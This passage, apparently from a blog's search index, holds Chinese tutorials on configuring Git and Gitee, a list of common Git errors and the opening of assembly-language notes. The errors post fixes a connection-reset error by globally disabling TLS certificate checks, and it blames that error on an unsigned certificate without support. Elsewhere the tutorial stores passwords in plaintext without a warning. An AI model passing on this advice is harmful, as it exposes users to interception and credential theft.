    <url>/2021/07/27/Tools/Git/Git-Gitee%E5%88%9D%E6%AD%A5%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>Git</strong> 是一个开源的<strong>分布式版本控制</strong>系统，用于敏捷高效地处理任何或小或大的项目。</p><p><strong>Gitee</strong> 是开源中国（OSChina）推出的<strong>基于 Git</strong> 的<strong>代码托管服务</strong>，提供免费的 Git 仓库。</p><p><strong>Git</strong> 文档：<a href="https://git-scm.com/book/zh/v2">Git - Book (git-scm.com)</a></p><p><strong>Gitee</strong> 帮助文档：<a href="https://gitee.com/help">Gitee 帮助中心 - Gitee.com</a></p><h2 id="一、用户信息配置"><a href="#一、用户信息配置" class="headerlink" title="一、用户信息配置"></a>一、用户信息配置</h2><p>第一个要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global user.name <span class="hljs-string">&quot;John&quot;</span><br>$ git config --global user.email john@example.com<br></code></pre></td></tr></table></figure><p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的仓库都会默认使用这里配置的用户信息。如果要在某个特定的仓库中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前仓库的 <code>.git/config</code> 文件里。</p><h2 id="二、数据传输协议"><a href="#二、数据传输协议" class="headerlink" title="二、数据传输协议"></a>二、数据传输协议</h2><p>Git 可以使用以下四种协议进行资料的传输：</p><ul><li>本地协议（Local）</li><li>HTTP/HTTPS 协议</li><li>SSH（Secure Shell）协议</li><li>git 协议</li></ul><p>其中，本地协议由于目前大都是进行远程开发和共享代码所以一般不常用，而 <code>git 协议</code> 由于缺乏授权机制且较难架设所以也不常用。</p><p>目前 Gitee 支持使用 <code>HTTPS协议</code> 和 <code>ssh 协议</code> 进行代码的推送/拉取。两种协议的差别仅在于同一个仓库使用不同协议时的地址不同，以及对应的授权实现不同。</p><h3 id="1、HTTPS-传输协议"><a href="#1、HTTPS-传输协议" class="headerlink" title="1、HTTPS 传输协议"></a>1、HTTPS 传输协议</h3><p><strong>HTTPS</strong> 利于匿名访问，适合开源项目可以方便被别人克隆和读取（ 但他没有 <code>push</code> 权限 ）。</p><p>当自己要进行 <code>push</code> 操作时，每次都需要我们进行用户名和密码的验证。</p><p>当然，为避免每次都输入密码，可以配置客户端记住密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global credential.helper store<br></code></pre></td></tr></table></figure><h3 id="2、SSH-传输协议"><a href="#2、SSH-传输协议" class="headerlink" title="2、SSH 传输协议"></a>2、SSH 传输协议</h3><p><strong>SSH</strong> 协议使用公钥认证比较适合内部项目。</p><p>使用 <strong>SSH</strong> 进行数据传输时，不再需要每次验证密码，但需要提前生成并在<strong>服务器端</strong>添加 <strong>SSH</strong> 公钥。</p><h4 id="1）生成-SSH-公钥"><a href="#1）生成-SSH-公钥" class="headerlink" title="1）生成 SSH 公钥"></a>1）生成 SSH 公钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh-keygen -t rsa -C <span class="hljs-string">&quot;xxxxx@xxxxx.com&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意：这里的 <code>xxxxx@xxxxx.com</code> 只是生成的 ssh-key 的名称，并不约束或要求具体命名为某个邮箱。<br>现网的大部分教程均讲解的使用邮箱生成，其一开始的初衷仅仅是为了便于辨识所以使用了邮箱。</p></blockquote><p>按照提示完成三次回车，即可生成 ssh-key。</p><p>通过查看 <code>~/.ssh/id_rsa.pub</code> 文件内容，获取 public key。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat ~/.ssh/id_rsa.pub<br></code></pre></td></tr></table></figure><h4 id="2）配置仓库的-SSH-公钥"><a href="#2）配置仓库的-SSH-公钥" class="headerlink" title="2）配置仓库的 SSH 公钥"></a>2）配置仓库的 SSH 公钥</h4><p>复制生成后的 ssh-key，通过仓库主页 <strong>「管理」-&gt;「部署公钥管理」-&gt;「添加部署公钥」</strong> ，添加生成的 public key 添加到仓库中。</p><p>添加后，在终端（Terminal）中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -T git@gitee.com<br></code></pre></td></tr></table></figure><p>首次使用需要确认并添加主机到本机 SSH 可信列表。若返回以下内容，则证明添加成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hi XXX! You<span class="hljs-string">&#x27;ve successfully authenticated, but Gitee.com does not provide shell access.</span><br></code></pre></td></tr></table></figure><h4 id="3）配置帐户的-SSH-公钥"><a href="#3）配置帐户的-SSH-公钥" class="headerlink" title="3）配置帐户的 SSH 公钥"></a>3）配置帐户的 SSH 公钥</h4><p>我们可以通过主页右上角 <strong>「个人设置」-&gt;「安全设置」-&gt;「SSH公钥」-&gt;「<a href="https://gitee.com/profile/sshkeys">添加公钥</a>」</strong> ，将上面生成的 public key 添加到当前账户中。</p><h4 id="4）仓库的-SSH-Key-和账户-SSH-Key-的区别"><a href="#4）仓库的-SSH-Key-和账户-SSH-Key-的区别" class="headerlink" title="4）仓库的 SSH Key 和账户 SSH Key 的区别"></a>4）仓库的 SSH Key 和账户 SSH Key 的区别</h4><ul><li>仓库的 SSH Key 具有且只有 <strong>“只读”</strong> 权限，即只能 <code>clone</code> 不能 <code>push</code></li><li>账户的 SSH Key 同时具备<code>clone</code> 和 <code>push</code> 的权限，对用户创建/参与的仓库均能使用，使用起来更加方便。</li></ul><blockquote><p>仓库的 ssh-key 只针对仓库，且我们仅对仓库提供了部署公钥，即<strong>仓库下的公钥仅能拉取仓库</strong>，这通常用于生产服务器拉取仓库的代码。<br>而用户的 ssh-key 则是针对用户的，用户添加了 key 就对用户名下的仓库和用户参加了的仓库具有权限，一般而言，<strong>用户的 key 具有推送和拉取的权限</strong>，<strong>而仓库的 key 则只具有拉取权限</strong>。</p></blockquote><p>所以，这里建议生成 SSH 公钥后直接配置帐户的 SSH 公钥。</p><h3 id="3、HTTPS-和-SSH-说明"><a href="#3、HTTPS-和-SSH-说明" class="headerlink" title="3、HTTPS 和 SSH 说明"></a>3、HTTPS 和 SSH 说明</h3><ul><li><p><strong>SSH</strong> 只能对自己创建的仓库或者 <strong>Fork</strong> 到自己名下的仓库进行 <code>clone、push</code>（ 推送和拉取 ），因此， <strong>如果用户想要使用 SSH 克隆的话，必须是这个仓库的拥有者</strong> 。</p></li><li><p><strong>HTTPS</strong> 可以对任意仓库进行 <code>clone</code> 操作，但注意对于其他人的仓库并没有 <code>push</code> 的权限，当然对于自己的仓库是有 <code>push</code> 的权限的，不过需要每次输入验证密码，但可以通过存储密码，避免每次输入。</p></li><li><p>总的来说，自己的仓库用哪个都可以，看个人习惯，我个人更习惯用 <strong>SSH</strong> （一开始根据老师的文档设置了 <strong>SSH</strong>），而其他人的仓库适合用 <strong>HTTPS</strong> （总不能为了用 <strong>SSH</strong> 而去 <strong>Fork</strong> 一个仓库吧）。</p></li></ul><h2 id="三、Git-仓库基础操作"><a href="#三、Git-仓库基础操作" class="headerlink" title="三、Git 仓库基础操作"></a>三、Git 仓库基础操作</h2><h3 id="1、仓库基本管理"><a href="#1、仓库基本管理" class="headerlink" title="1、仓库基本管理"></a>1、仓库基本管理</h3><h4 id="1）初始化一个Git仓库"><a href="#1）初始化一个Git仓库" class="headerlink" title="1）初始化一个Git仓库"></a>1）初始化一个Git仓库</h4><p>以 <code>/home/gitee/test</code> 文件夹为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home/gitee/<span class="hljs-built_in">test</span>    <span class="hljs-comment">#进入git文件夹</span><br>$ git init               <span class="hljs-comment">#初始化一个Git仓库</span><br></code></pre></td></tr></table></figure><h4 id="2）将文件添加到-Git-的暂存区"><a href="#2）将文件添加到-Git-的暂存区" class="headerlink" title="2）将文件添加到 Git 的暂存区"></a>2）将文件添加到 Git 的暂存区</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git add <span class="hljs-string">&quot;readme.txt&quot;</span> <br></code></pre></td></tr></table></figure><p>注：使用 <code>git add -A</code> 或 <code>git add .</code> 可以提交当前仓库的所有改动。</p><h4 id="3）从-Git-的暂存区提交版本到仓库"><a href="#3）从-Git-的暂存区提交版本到仓库" class="headerlink" title="3）从 Git 的暂存区提交版本到仓库"></a>3）从 Git 的暂存区提交版本到仓库</h4><p>参数 <code>-m</code> 后为当次提交的备注信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br></code></pre></td></tr></table></figure><h4 id="4）将本地的-Git-仓库信息推送上传到服务器"><a href="#4）将本地的-Git-仓库信息推送上传到服务器" class="headerlink" title="4）将本地的 Git 仓库信息推送上传到服务器"></a>4）将本地的 Git 仓库信息推送上传到服务器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push https://gitee.com/***/test.git<br></code></pre></td></tr></table></figure><h4 id="5）查看-Git-提交的日志"><a href="#5）查看-Git-提交的日志" class="headerlink" title="5）查看 Git 提交的日志"></a>5）查看 Git 提交的日志</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><h3 id="2、远程仓库管理"><a href="#2、远程仓库管理" class="headerlink" title="2、远程仓库管理"></a>2、远程仓库管理</h3><h4 id="1）修改仓库名"><a href="#1）修改仓库名" class="headerlink" title="1）修改仓库名"></a>1）修改仓库名</h4><p>一般来讲，默认情况下，在执行 <code>clone</code> 或者其他操作时，仓库名都是 <strong>origin</strong> ，如果说我们想给他改改名字，比如我不喜欢 <strong>origin</strong> 这个名字，想改为 <strong>oschina</strong> ，那么就要在仓库目录下执行命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote rename origin oschina<br></code></pre></td></tr></table></figure><p>这样，你的远程仓库名字就改成了<strong>oschina</strong>，同样，以后推送时执行的命令就不再是 <code>git push origin master</code> 而是 <code>git push oschina master</code> 拉取也是一样的。</p><h4 id="2）添加一个仓库"><a href="#2）添加一个仓库" class="headerlink" title="2）添加一个仓库"></a>2）添加一个仓库</h4><p>在不执行克隆操作时，如果想将一个远程仓库添加到本地的仓库中，可以执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote add origin  仓库地址<br></code></pre></td></tr></table></figure><p>注意: </p><ul><li><p><strong>origin</strong> 是你的仓库的别名 可以随便改，但请务必不要与已有的仓库别名冲突 </p></li><li><p>仓库地址一般来讲支持 <code>http/https/ssh/git</code> 协议，其他协议地址请勿添加</p></li></ul><h4 id="3）查看当前仓库对应的远程仓库地址"><a href="#3）查看当前仓库对应的远程仓库地址" class="headerlink" title="3）查看当前仓库对应的远程仓库地址"></a>3）查看当前仓库对应的远程仓库地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote -v<br></code></pre></td></tr></table></figure><p>这条命令能显示你当前仓库中已经添加了的仓库名和对应的仓库地址，通常来讲，会有两条一模一样的记录，分别是 <code>fetch</code> 和 <code>push</code>，其中 <code>fetch</code> 是用来从远程同步，<code>push</code> 是用来推送到远程。</p><h4 id="4）修改仓库对应的远程仓库地址"><a href="#4）修改仓库对应的远程仓库地址" class="headerlink" title="4）修改仓库对应的远程仓库地址"></a>4）修改仓库对应的远程仓库地址</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote set-url origin 仓库地址<br></code></pre></td></tr></table></figure><h2 id="四、Git-常用命令"><a href="#四、Git-常用命令" class="headerlink" title="四、Git 常用命令"></a>四、Git 常用命令</h2><h3 id="1、git-clone"><a href="#1、git-clone" class="headerlink" title="1、git clone"></a>1、git clone</h3><p><code>git clone</code> 实际上是一个封装了其他几个命令的命令。 它创建了一个新目录，切换到新的目录，然后 <code>git init</code> 来初始化一个空的 Git 仓库， 然后为你指定的 URL 添加一个（默认名称为 <code>origin</code> 的）远程仓库（<code>git remote add</code>），再针对远程仓库执行 <code>git fetch</code>，最后通过 <code>git checkout</code> 将远程仓库的最新提交检出到本地的工作目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> 仓库地址(HTTPS or SSH)<br>$ git <span class="hljs-built_in">clone</span> https://gitee.com/***/test.git<br>$ git <span class="hljs-built_in">clone</span> 仓库地址 文件目录                   <span class="hljs-comment">#克隆到指定目录</span><br></code></pre></td></tr></table></figure><h3 id="2、git-status"><a href="#2、git-status" class="headerlink" title="2、git status"></a>2、git status</h3><p><code>git status</code> 命令会显示工作区及暂存区域中不同状态的文件。 其中包含了已修改但未暂存，或已经暂存但没有提交的文件。 在一般的显示形式中，它会给你一些如何在这些暂存区之间移动文件的提示。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git status<br></code></pre></td></tr></table></figure><h3 id="3、git-add"><a href="#3、git-add" class="headerlink" title="3、git add"></a>3、git add</h3><p><code>git add</code> 命令将内容从工作目录添加到暂存区（或称为索引（index）区），以备下次提交。 当 <code>git commit</code> 命令执行时，默认情况下它只会检查暂存区域，因此 <code>git add</code> 是用来确定下一次提交时快照的样子的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git add <span class="hljs-string">&quot;readme.txt&quot;</span>   <span class="hljs-comment">#提交readme.txt到暂存区</span><br>$ git add -A             <span class="hljs-comment">#提交当前仓库的所有改动</span><br>$ git add .              <span class="hljs-comment">#提交当前仓库的所有改动</span><br></code></pre></td></tr></table></figure><h3 id="4、git-commit"><a href="#4、git-commit" class="headerlink" title="4、git commit"></a>4、git commit</h3><p><code>git commit</code> 命令将所有通过 <code>git add</code> 暂存的文件内容在数据库中创建一个持久的快照，然后将当前分支上的分支指针移到其之上。</p><p>参数 <code>-m</code> 后为当次提交的备注信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br></code></pre></td></tr></table></figure><h3 id="5、git-push"><a href="#5、git-push" class="headerlink" title="5、git push"></a>5、git push</h3><p><code>git push</code> 命令用来与另一个仓库通信，计算你本地数据库与远程仓库的差异，然后将差异推送到另一个仓库中。 它需要有另一个仓库的写权限，因此这通常是需要验证的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push https://gitee.com/***/test.git<br>$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;   <span class="hljs-comment">#git remote后</span><br>$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;              <span class="hljs-comment">#本地分支名与远程分支名相同</span><br></code></pre></td></tr></table></figure><p>以下命令将本地的 master 分支推送到 origin 主机的 master 分支。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push origin master:master<br>$ git push origin master           <span class="hljs-comment">#本地分支名与远程分支名相同</span><br>$ git push origin                  <span class="hljs-comment">#当前分支与远程分支存在追踪关系</span><br>$ git push                         <span class="hljs-comment">#当前分支只有一个追踪分支</span><br></code></pre></td></tr></table></figure><p>如果当前分支与多个主机存在追踪关系，那么这个时候 <strong>-u</strong> 选项会指定一个默认主机，这样后面就可以不加任何参数使用 <code>git push</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push -u origin master<br></code></pre></td></tr></table></figure><p>上面命令将本地的 <strong>master</strong> 分支推送到 <strong>origin</strong> 主机，同时指定 <strong>origin</strong> 为<strong>默认主机</strong>，后面就可以不加任何参数使用<code>git push</code> 了。</p><h3 id="6、git-init"><a href="#6、git-init" class="headerlink" title="6、git init"></a>6、git init</h3><p>你只需要简单地运行 <code>git init</code> 就可以将一个目录转变成一个 Git 仓库，这样你就可以开始对它进行版本管理了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git init               <span class="hljs-comment">#初始化一个Git仓库</span><br></code></pre></td></tr></table></figure><h3 id="7、git-remote"><a href="#7、git-remote" class="headerlink" title="7、git remote"></a>7、git remote</h3><p><code>git remote</code> 命令是一个是你远程仓库记录的管理工具。 它允许你将一个长的 URL 保存成一个简写的句柄，例如 <code>origin</code> ，这样你就可以不用每次都输入他们了。 你可以有多个这样的句柄，<code>git remote</code> 可以用来添加，修改，及删除它们。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote add &lt;name&gt; &lt;url&gt;<br></code></pre></td></tr></table></figure><h3 id="8、git-pull"><a href="#8、git-pull" class="headerlink" title="8、git pull"></a>8、git pull</h3><p><code>git pull</code> 命令基本上就是 <code>git fetch</code> 和 <code>git merge</code> 命令的组合体，Git 从你指定的远程仓库中抓取内容，然后马上尝试将其合并进你所在的分支中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;<br></code></pre></td></tr></table></figure><p>将远程主机 origin 的 master 分支拉取过来，与本地的 brantest 分支合并。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull origin master:brantest<br></code></pre></td></tr></table></figure><p>如果远程分支是与当前分支合并，则冒号后面的部分可以省略。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull origin master<br></code></pre></td></tr></table></figure><p>如果当前分支与远程分支存在追踪关系，<code>git pull</code>就可以省略远程分支名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull origin<br></code></pre></td></tr></table></figure><p>如果当前分支只有一个追踪分支，连远程主机名都可以省略。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull<br></code></pre></td></tr></table></figure><h2 id="五、获取与推送项目"><a href="#五、获取与推送项目" class="headerlink" title="五、获取与推送项目"></a>五、获取与推送项目</h2><p>有几种方式获取一个 Git 仓库。 一种是从网络上或者其他地方拷贝一个现有的仓库，另一种就是在一个目录中创建一个新的仓库。</p><h3 id="1、远端克隆"><a href="#1、远端克隆" class="headerlink" title="1、远端克隆"></a>1、远端克隆</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://gitee.com/***/test.git<br><span class="hljs-comment"># 创建、修改</span><br>$ git status<br>$ git add -A<br>$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br>$ git push origin master<br></code></pre></td></tr></table></figure><h3 id="2、本地创建"><a href="#2、本地创建" class="headerlink" title="2、本地创建"></a>2、本地创建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mkdir <span class="hljs-built_in">test</span><br>$ <span class="hljs-built_in">cd</span> <span class="hljs-built_in">test</span><br>$ git init<br><span class="hljs-comment"># 创建、修改</span><br>$ git status<br>$ git add -A<br>$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br>$ git remote add origin https://gitee.com/***/test.git<br>$ git push origin master<br></code></pre></td></tr></table></figure><h2 id="六、参与项目的一般流程"><a href="#六、参与项目的一般流程" class="headerlink" title="六、参与项目的一般流程"></a>六、参与项目的一般流程</h2><p>1、<strong>Fork</strong> 项目仓库，建立派生仓库，作为自己 <strong>Gitee</strong> 上的远端仓库</p><p>2、获取远端仓库，一般为 <code>clone</code> 远端仓库</p><p>3、进行修改</p><p>4、推送项目到远端仓库</p><p>5、提交 <strong>Pull Requests</strong> </p><p>注：如果是自己创建的开发项目，则不需要进行 <strong>Fork</strong> 和 <strong>Pull Requests</strong> </p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gitee</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git常见出错</title>
    <link href="/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/"/>
    <url>/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/</url>
    
    <content type="html"><![CDATA[<h2 id="1、连接超时"><a href="#1、连接超时" class="headerlink" title="1、连接超时"></a>1、连接超时</h2><p><strong>1）错误</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal: unable to access ······: OpenSSL SSL_read: Connection was reset, errno 10054<br></code></pre></td></tr></table></figure><p><strong>2）原因分析</strong></p><p>连接超时 。</p><p><strong>3）解决办法</strong></p><p>重试</p><h2 id="2、SSL验证"><a href="#2、SSL验证" class="headerlink" title="2、SSL验证"></a>2、SSL验证</h2><p><strong>1）错误</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">error: RPC failed; curl 28 OpenSSL SSL_read: Connection was reset, errno 10054<br>fatal: expected flush after ref listing<br></code></pre></td></tr></table></figure><p><strong>2）原因分析</strong></p><p>服务器的 SSL 证书没有经过第三方机构的签署 。</p><p><strong>3）解决办法</strong></p><p>修改设置，解除 SSL 验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global http.sslVerify <span class="hljs-string">&quot;false&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3、远端名称不符"><a href="#3、远端名称不符" class="headerlink" title="3、远端名称不符"></a>3、远端名称不符</h2><p><strong>1）错误</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">error: src refspec master does not match any<br>error: failed to push some refs to ······<br></code></pre></td></tr></table></figure><p><strong>2）原因分析</strong></p><p>GitHub 远端仓库分支由原来的 <code>master</code> 改为了 <code>main</code>，<code>push</code> 时还使用 <code>master</code> 就会导致名称不符 。</p><p><strong>3）解决办法</strong></p><p>将 <code>master</code> 改为了 <code>main</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push -u origin main<br></code></pre></td></tr></table></figure><h2 id="4、输入不可见字符"><a href="#4、输入不可见字符" class="headerlink" title="4、输入不可见字符"></a>4、输入不可见字符</h2><p><strong>1）错误</strong></p><p><strong>Git Bash：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> git@gitee.com:keys942/C_samplecode.git<br>Cloning into <span class="hljs-string">&#x27;C_samplecod&#x27;</span>...<br>Permission denied, user: <span class="hljs-string">&#x27;git&#x27;</span><br><br>fatal: Could not <span class="hljs-built_in">read</span> from remote repository.<br><br>Please make sure you have the correct access rights and the repository exists.<br></code></pre></td></tr></table></figure><p><img src="/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/8bedb3b37bbaa68e2f3d18356b8e0143.png" alt="image-20211127173707426"></p><p><strong>2）原因分析</strong></p><p>出现不可见字符，导致仓库路径错误 。</p><p><strong>Sublime：</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ git clone <span class="hljs-symbol">&lt;0x96&gt;</span>git@gitee.<span class="hljs-keyword">com</span>:keys942/C_samplecode.git<br>Cloning into <span class="hljs-string">&#x27;C_samplecod&#x27;</span>...<br>Permission denied, user: <span class="hljs-string">&#x27;&lt;0x96&gt;git&#x27;</span><br><br>fata<span class="hljs-variable">l:</span> Could not <span class="hljs-keyword">read</span> from remote repository.<br><br>Please <span class="hljs-keyword">make</span> sure you have the correct access rights <span class="hljs-built_in">and</span> the repository <span class="hljs-built_in">exists</span>.<br></code></pre></td></tr></table></figure><p><img src="/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/c2b10d147bec095f55e44e45ee1a3e42.png" alt="image-20211127173733563"></p><p><strong>3）解决办法</strong></p><p>去掉不可见字符 。</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gitee</tag>
      
      <tag>git</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Assembly</title>
    <link href="/2021/07/27/Code/Assembly/Assembly/"/>
    <url>/2021/07/27/Code/Assembly/Assembly/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章-汇编语言的基础知识"><a href="#第一章-汇编语言的基础知识" class="headerlink" title="第一章 汇编语言的基础知识"></a>第一章 汇编语言的基础知识</h1><h2 id="1-1-汇编语言的一般概念"><a href="#1-1-汇编语言的一般概念" class="headerlink" title="1.1 汇编语言的一般概念"></a>1.1 汇编语言的一般概念</h2><h3 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h3><p>虽然高级语言方便了人对计算机的使用，但其运行效率较低。在一些应用场景，如系统管理、实时控制等，难于满足要求。因此又希望使用机器语言。</p><p>为了便于记忆和阅读，使用字母和符号来表示机器语言的命令，用十进制或十六进制数来表示数据，这样的计算机程序设计语言就称为汇编语言。</p><h3 id="二、汇编语言程序与机器语言程序的关系"><a href="#二、汇编语言程序与机器语言程序的关系" class="headerlink" title="二、汇编语言程序与机器语言程序的关系"></a>二、汇编语言程序与机器语言程序的关系</h3><p>一条汇编语言的语句与一条机器语言指令对应，汇编语言程序与机器语言程序效率相同。</p><h3 id="三、不同类型计算机有不同的机器指令系统和汇编语言描述"><a href="#三、不同类型计算机有不同的机器指令系统和汇编语言描述" class="headerlink" title="三、不同类型计算机有不同的机器指令系统和汇编语言描述"></a>三、不同类型计算机有不同的机器指令系统和汇编语言描述</h3><p>为了学习和使用某种计算机的汇编语言，必须熟悉计算机的内部组成结构。但并非要掌握计算机系统的全部硬件组成，只需掌握用汇编语言编制程序时所涉及到的那些硬件的结构和功能。</p><p>对一台计算机来说，机器语言的执行主要取决于该计算机的中央处理器CPU。因此熟悉计算机内部结构主要是指CPU的功能结构。它包括：</p><ul><li>CPU 中有多少个寄存器及其作用？</li><li>CPU 是如何访问存储器？</li><li>输入输出操作的方式有哪些？</li></ul><h3 id="四、IBM-PC系列微型计算机及其汇编语言"><a href="#四、IBM-PC系列微型计算机及其汇编语言" class="headerlink" title="四、IBM-PC系列微型计算机及其汇编语言"></a>四、IBM-PC系列微型计算机及其汇编语言</h3><h2 id="1-2-学习和使用汇编语言的目的"><a href="#1-2-学习和使用汇编语言的目的" class="headerlink" title="1.2 学习和使用汇编语言的目的"></a>1.2 学习和使用汇编语言的目的</h2><h3 id="1、学习和使用汇编语言可以从根本上认识、理解计算机的工作过程。"><a href="#1、学习和使用汇编语言可以从根本上认识、理解计算机的工作过程。" class="headerlink" 